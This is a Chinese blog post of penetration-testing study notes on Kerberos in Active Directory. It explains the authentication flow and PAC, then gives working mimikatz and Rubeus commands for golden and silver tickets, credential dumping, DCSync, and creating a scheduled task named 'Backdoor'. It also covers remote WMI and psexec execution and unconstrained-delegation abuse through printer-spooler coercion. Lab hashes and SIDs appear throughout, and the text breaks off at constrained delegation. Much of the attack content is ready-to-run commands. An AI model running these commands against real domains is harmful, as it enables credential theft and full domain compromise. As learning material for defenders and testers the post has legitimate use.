<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透之kerberos"><meta name="keywords" content=""><meta name="author" content="Dar1in9"><meta name="copyright" content="Dar1in9"><title>内网渗透之kerberos | Dar1in9's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"MY1GAADR9W","apiKey":"5032629da4e94f659d98a4052bc1c5cd","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">Kerberos 认证原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerbros%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-number">1.1.</span> <span class="toc-text">Kerbros协议的组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">Kerberos认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-number">1.3.</span> <span class="toc-text">PAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9C%8D%E5%8A%A1%EF%BC%88cifs%EF%BC%89%E6%9D%83%E9%99%90"><span class="toc-number">3.1.</span> <span class="toc-text">伪造共享文件夹服务（cifs）权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0LDAP%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">3.2.</span> <span class="toc-text">伪造LDAP服务权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">伪造计划任务服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0wmi%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">3.4.</span> <span class="toc-text">伪造wmi服务权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.1.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">4.2.</span> <span class="toc-text">约束委派</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B8%A3%E8%B0%A2"><span class="toc-number">6.</span> <span class="toc-text">鸣谢</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/kakashi-cat.jpg"></div><div class="author-info__name text-center">Dar1in9</div><div class="author-info__description text-center">人间值得，未来可期</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/Dar1in9s">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">74</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">14</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://gryffinbit.top">Gryffinbit</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/Background2.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Dar1in9's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">内网渗透之kerberos</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-06</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.2k</span><span class="post-meta__separator">|</span><span>阅读时长: 15 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这是《内网渗透体系建设》学习笔记，第六篇：kerberos协议</p>
<span id="more"></span>


<h2 id="Kerberos-认证原理"><a href="#Kerberos-认证原理" class="headerlink" title="Kerberos 认证原理"></a>Kerberos 认证原理</h2><p>kerberos是一种计算机网络认证协议，他能够为网络中通信的双方提供严格的身份验证服务，确保通信双方身份的真实性和安全性。</p>
<p>不同于其他网络服务，kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能够建立连接然后进行加密通信。而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。</p>
<p>即<strong>kerberos协议的侧重在于认证通信双方的身份</strong>，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。</p>
<p><strong>Kerbros认证，解决了“如何证明我是我的问题”</strong></p>
<h3 id="Kerbros协议的组成"><a href="#Kerbros协议的组成" class="headerlink" title="Kerbros协议的组成"></a>Kerbros协议的组成</h3><p>Kerberos认证协议是基于票据的一种认证方式，可以分为三部分：用户（client）、服务器（Server）和KDC（Key Distribute Center、密钥分发中心）。</p>
<p>KDC包括AS（Authentication Server，认证服务器）和TGS（Ticket Granting Server、票据授权服务器）。</p>
<ul>
<li>AS，认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</li>
<li>TGS，票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</li>
</ul>
<p>在域环境中，KDC服务部署在控制器DC上，DC中还有一个AD（Account Database），类似于 SAM的数据库，存储所有 Client的白名单，只有处于白名单中的 Client才可以成功申请 TGT</p>
<h3 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h3><p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202302261120725.png"></p>
<p><strong>① AS_REQ（Client -&gt;AS）</strong><br>Client向AS发起AS_REQ，请求内容为通过Client的哈希加密的时间戳、ClientID等内容</p>
<blockquote>
<p>身份信息（username&#x2F;host）<br>包括：<strong>Pre-Authentication data</strong>(一个被Client Hash加密的TimeStamp，用于KDC验证客户端信息)、<strong>Client Info</strong>(Client标识，KDC以此查找Client的Hash)、<strong>Server Info</strong></p>
</blockquote>
<p><strong>② AS_REP（AS -&gt; Client）</strong><br>AS使用Client Info在AD中查找Client的NTLM-Hash，使用Client的NTLM-Hash进行解密，如果解密正确，则证明客户端提供的密码正确。<br>然后 AS 会生成一个临时秘钥 Session-Key，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此 Session-key AS 用于确保客户端和 KGS 之间的通信安全。<br>还有一部分内容是用krbtgt的NTLM-hash加密的TGT（Ticket Granting Ticket，票据授权凭证）票据。TGT包括PAC（Privilege Attribute Certificate，特权属证书），PAC包含Client的相关权限信息，如SID和所在的组。简单理解，PAC就是用于验证用户权限，<strong>只有KDC能制作和查看PAC</strong>。</p>
<blockquote>
<p>包括：<strong>一个被Client Hash加密的Session Key</strong>：Client_Pass_Hash(Session Key)、<strong>TGT</strong>：KDC_Hash(Session Key, Client Info, End Time)<br>Session Key用于后续与TGS进行通信</p>
</blockquote>
<p><strong>③ TGS_REQ（Client-&gt;TGS）</strong><br>Client获得了 TGT 和加密的 Session-Key。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key。<br>Client 会使用 Session-Key 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 TGT 作为另一部分继续发送给 TGS</p>
<blockquote>
<p>包括：<strong>TGT</strong>：KDC_Hash(Session Key, Client Info, End Time)、<strong>Session_Key(Client Info, Timestamp)<strong>、</strong>Client</strong>、<strong>Server Info</strong></p>
</blockquote>
<p><strong>④ TGS_REP（TGS-&gt;Client）</strong><br>TGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key、时间戳、Client-info 以及 Server-info。再用 Session-key解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，如果时间戳跟当前时间相差太久，就需要重新认证。TGS 还会将这个 Client 的信息与 TGT 中的 Client 信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server，如果都没有问题，认证成功。<br>认证成功后，KGS 会生成一个Server Session-key ，并用 Session-key 加密 Server Session-key 作为响应的一部分。此 Server Session-key 用于确保客户端和服务器之间的通信安全。<br>另一部分是使用服务器 Server 的 NTLM-Hash 加密Server Session-key、时间戳以及 Client-info 等数据生成的 ST，并带上PAC。在kerberos认证过程中，不论用户有没有访问服务的权限，只要TGT正确，就会返回ST。</p>
<blockquote>
<p>包括：<strong>Session_key(Server Session Key)<strong>、</strong>Ticket</strong>：Server_Hash(Server Session Key、Client Info、End Time)<br>Server Session Key用于客户端和服务端的通信</p>
</blockquote>
<p><strong>⑤ AP_REQ（Client-&gt;Server）</strong><br>客户端 Client 收到TGS_REP后，分别获得了 ST 和加密的Server Session-Key。它会先使用Session-key解密出了原始的 Server Session-key。<br>Client使用Server Session-key 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server</p>
<blockquote>
<p><strong>Ticket</strong>：Server_Hash(Server Session Key、Client Info、End Time)、<strong>Server_Session_Key(Client Info、Timstamp)</strong></p>
</blockquote>
<p><strong>⑥ AP_REP（Server-&gt;Client）</strong><br>服务使用自己的NTLM-hash解密ST。如果解密正确，就会将其中的PAC给KDC解密，KDC由此判断Client是否具有访问服务的权限。</p>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202302262158561.png"></p>
<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题。</p>
<p>为了解决上面的这个问题，微软引进了PAC。即 KDC 向客户端 Client 返回AS_REP时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的AP_REQ请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>在Kerberos认证过程中，Client的TGT是使用krbtgt的NTML哈希值加密生成的，如果获得了krbtgt的哈希值，便可以<strong>伪造TGT</strong>，从而伪造任意用户的票据。这种攻击方式称为黄金票据（Golden Ticket）。</p>
<p>攻击需要以下信息：域名、域sid、krbtgt哈希值，伪造的用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user    获取域的sid值(去掉最后的-500，500表示为administrator用户)</span><br><span class="line">net config workstation  查看所处域</span><br></pre></td></tr></table></figure>

<p>① 在DC上用mimikatz执行如下命令，得到krbtgt的哈希</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202302270923589.png"></p>
<p>② 利用mimikatz生成黄金票据，并导入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::golden /user:Administrator /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /krbtgt:46ff2921e1cbc03aa37acf91b8afe9df /ticket:ticket.kirbi&quot; &quot;kerberos::ptt ticket.kirbi&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">kerberos::purge  清除票据</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">kerberos::golden /user:用户名 /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的NTLM哈希 /ticket:票据名称.kirbi        生成黄金票据</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">kerberos::ptt ticket.kirbi 导入票据</span></span><br></pre></td></tr></table></figure>

<p>③ 之后执行其他操作就不需要指定用户名和密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br><span class="line"></span><br><span class="line">wmic /node:dc process call create &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;</span><br><span class="line">wmic /node:dc process list brief</span><br><span class="line">psexec.exe -accepteula \\dc -s cmd.exe</span><br></pre></td></tr></table></figure>

<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p> 黄金票据伪造的是TGT，白银票据（Silver Ticket）是伪造服务票据（ST）。在没有配置PAC的情况下，如果Server NTLM-has被泄露，那么就可以利用Server NTLM-has来伪造任意服务的票据，从而访问服务器上的任意服务。</p>
<p>所需条件：域名、域sid、目标服务器名、可利用的服务、服务账号的NTML HASH 、需要伪造的用户名</p>
<p>获取服务账户的密码HASH</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; pwd.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202302271143992.png"></p>
<p>② 制作白银票据并访问服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden </span><br><span class="line"></span><br><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure>

<p>可以伪造的服务：</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>服务名</th>
</tr>
</thead>
<tbody><tr>
<td>WMI</td>
<td>host、rpcss</td>
</tr>
<tr>
<td>powershell remoting</td>
<td>host、http</td>
</tr>
<tr>
<td>winrm</td>
<td>host、http</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>host</td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>cifs</td>
</tr>
<tr>
<td>LDAP</td>
<td>ldap</td>
</tr>
</tbody></table>
<h3 id="伪造共享文件夹服务（cifs）权限"><a href="#伪造共享文件夹服务（cifs）权限" class="headerlink" title="伪造共享文件夹服务（cifs）权限"></a>伪造共享文件夹服务（cifs）权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 制作票据并导入</span></span></span><br><span class="line">kerberos::golden /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /target:dc.hackme.com /service:cifs /rc4:a678800c3444a2fdb1ef68e2c5b208bf /user:administrator /ptt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">访问共享文件服务</span></span><br><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>

<h3 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h3><p>如果已经获取DC机器账户的哈希值，便可以使用银票访问其LDAP服务，执行mimikatz的DCSync，以获取krbtgt用户的hash，进而制作黄金票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 制作票据并导入</span></span></span><br><span class="line">kerberos::golden /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /target:dc.hackme.com /service:ldap /rc4:a678800c3444a2fdb1ef68e2c5b208bf /user:administrator /ptt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 执行dcsync，向DC发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</span></span></span><br><span class="line">lsadump::dcsync /domain:hackme.com /user:krbtgt</span><br></pre></td></tr></table></figure>

<h3 id="伪造计划任务服务"><a href="#伪造计划任务服务" class="headerlink" title="伪造计划任务服务"></a>伪造计划任务服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 制作host服务票据并导入</span></span></span><br><span class="line">kerberos::golden /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /target:dc.hackme.com /service:host /rc4:a678800c3444a2fdb1ef68e2c5b208bf /user:administrator /ptt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 执行计划任务命令</span></span></span><br><span class="line">schtasks /Create /S dc.hackme.com /TN Backdoor /SC minute /MO 1/TR calc.exe /F</span><br></pre></td></tr></table></figure>


<h3 id="伪造wmi服务权限"><a href="#伪造wmi服务权限" class="headerlink" title="伪造wmi服务权限"></a>伪造wmi服务权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 制作host服务票据并导入</span></span></span><br><span class="line">kerberos::golden /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /target:dc.hackme.com /service:host /rc4:a678800c3444a2fdb1ef68e2c5b208bf /user:administrator /ptt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 制作rpcss服务票据并导入</span></span></span><br><span class="line">kerberos::golden /domain:hackme.com /sid:S-1-5-21-3819194653-65834573-1010597107 /target:dc.hackme.com /service:rpcss /rc4:a678800c3444a2fdb1ef68e2c5b208bf /user:administrator /ptt</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># 执行wmi</span></span></span><br><span class="line">wmic /node:dc.hackme.com process list brief</span><br></pre></td></tr></table></figure>


<h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</p>
<p>委派分为非约束委派、约束委派和基于资源的约束委派。</p>
<p><strong>注意：能够被委派的用户只能是服务账号或者机器账号，并且被委派的用户不能被设置为不能被委派属性。</strong></p>
<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>对于非约束性委派 （Unconstrained Delegation），服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT， 模拟该用户访问任意服务。</p>
<p><img src="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ms-sfu_files/image001.png"></p>
<p>如果管理员访问了某个开启非约束委派的服务，则该服务所在计算机会将域管理员的TGT保存至内存，那么获得其特权便可以获得域控权限。</p>
<p>对计算机设置非约束委派：</p>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202303111850609.png"></p>
<p><strong>查找非约束委派的主机或服务账户</strong></p>
<p>adfind：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">查找域中配置非约束委派的用户</span></span><br><span class="line">AdFind.exe -b &quot;DC=hackme,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查找域中配置非约束委派的主机</span></span><br><span class="line">AdFind.exe -b &quot;DC=hackme,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
<p>powersploit中的powerview （meterpreter中）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">powershell_import PowerView.ps1</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查询非约束委派的主机</span> </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">Get-NetComputer -Unconstrained -Domain hackme.com</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查询非约束委派的服务账号</span> </span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">Get-NetUser -Unconstrained -Domain hackme.com | select name</span></span><br></pre></td></tr></table></figure>

<p><strong>非约束委派的常规利用</strong></p>
<p>当一台主机设置了非委派约束，我们已经拿到了其控制权限，在此机器上可以使用mimikatz导出内存中的所有票据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>如果域管理员访问过该机器，则会有域管理员的tgt票据存在：</p>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202303121047419.png"></p>
<p>其中编号 0 &#x3D; TGS, 1 &#x3D; client ticket(?) and 2 &#x3D; TGT</p>
<p>使用<code>kerberos::ptt</code>导入票据，之后即可访问</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202303121050585.png"></p>
<p><strong>使用Spooler打印机服务主动连接</strong></p>
<p>上面的攻击方式要求管理员连接过该计算机服务，否则无法利用。在特定的条件下，可以利用Spooler打印机服务让域控主动连接服务。</p>
<p>在Spooler服务默认开启的情况下，域用户可以利用Windows打印机系统远程协议（MS-RPRN）强制任何运行了Spoler服务的域内计算机通过kerberos或NTLM协议对任何目标进行身份验证。</p>
<p>1、在开启非约束委派的机器上使用Rubeus对域控账户的登录进行监听（需要本地管理员权限）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC$</span><br><span class="line"><span class="meta"># </span><span class="language-bash">1秒监听一次，过滤出机器账户DC$的连接</span></span><br></pre></td></tr></table></figure>
<p>2、使用SpoolSample工具执行打印机漏洞利用，进行强制验证，此时Rubeus可以监听到TGT</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC Win7</span><br></pre></td></tr></table></figure>
<p>3、Rubeus监听到票据并导入该票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">rubeus导入票据</span></span><br><span class="line">Rubeus.exe ptt /ticket:doIFGjCCBRagAw...VEVBTS5MQUI=</span><br></pre></td></tr></table></figure>
<p>4、利用mimikatz进行dcsync</p>
<p>注意：这里获取到的TGT其实是DC的机器账户，而机器账户是没有权限访问cifs服务的，但是在LDAP服务中，机器账户会被当作域控机器，从而可以dcsync。</p>
<p>另一种方式，使用mimikatz导出票据，找到<code>DC$</code>的<code>tgt</code>，之后再使用mimikatz导入<br><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202303121145724.png"></p>
<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能，对Kerberos协议进行了扩展，引入了S4U协议：<code>S4U2Self(Service for User to Self)</code>和<code>S4U2Proxy(Service for User to Proxy</code>。</p>
